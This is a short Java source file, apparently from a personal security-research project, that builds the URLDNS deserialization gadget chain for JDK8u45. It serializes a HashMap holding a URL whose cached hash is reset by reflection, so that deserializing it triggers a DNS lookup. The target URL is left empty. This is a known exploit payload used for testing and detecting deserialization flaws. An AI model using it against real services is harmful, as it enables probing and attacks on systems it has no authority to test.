package com.p2hm1n.gadget;

import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;


/**
 * URLDNS 的 gadget
 * 测试环境 JDK8u45
 *
 * Gadget Chain:
 *    HashMap.readObject()
 *      HashMap.putVal()
 *        HashMap.hash()
 *          URL.hashCode()
 */
public class URLDNS {
    public static void main(String[] args) throws Exception {
        String source = "";
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap();
        URL u = new URL(null, source, handler);
        ht.put(u, source);
        Reflections.setFieldValue(u, "hashCode", -1);
        PayloadRunner.run(ht);
    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }
        @Override
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
